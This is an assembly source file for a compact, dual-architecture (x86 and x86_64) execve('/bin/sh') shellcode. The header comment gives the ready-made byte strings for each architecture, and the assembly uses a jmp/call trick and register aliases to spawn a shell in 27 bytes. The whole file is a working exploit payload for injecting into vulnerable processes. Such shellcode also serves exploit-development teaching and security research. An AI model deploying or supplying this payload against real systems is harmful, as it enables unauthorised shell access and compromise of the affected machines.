# /* both x86 & x64 - execve("/bin/sh", ["/bin/sh", 0], 0) - (27 bytes) */
# char shellcode32[] = "\x6a\x0b\x58\x99\x52\xeb\x08\x54\x59\x5b\x88\x53\x07\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
# char shellcode64[] = "\x6a\x3b\x58\x99\x52\xeb\x08\x54\x5e\x5f\x88\x57\x07\x0f\x05\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

# Register aliases to make it both x86 and x86_64 compatible #
.if ARCH == 64
	.set SYS_EXECVE, 59
	.set EAX, %rax
	.set EBX, %rdi
	.set ECX, %rsi
	.set EDX, %rdx
	.set ESP, %rsp
	.macro _SYSCALL_
		syscall
	.endm
.else
	.set SYS_EXECVE, 11
	.set EAX, %eax
	.set EBX, %ebx
	.set ECX, %ecx
	.set EDX, %edx
	.set ESP, %esp
	.macro _SYSCALL_
		int $0x80
	.endm
.endif

.text
.globl _start
_start:
	push	$SYS_EXECVE	# sys_execve
	pop	EAX
	cdq			# env = NULL
	push	EDX		# argv[1]
	jmp	binsh
back:
	push	ESP
	pop	ECX		# argv
	pop	EBX		# argv[0] = address of '/bin/sh'
	movb	%dl, 0x7(EBX)	# null-terminator
	_SYSCALL_		# syscall
binsh:
	call back		# pushl next_instr; jmp back
	.ascii "/bin/sh"	# <-- next_instr
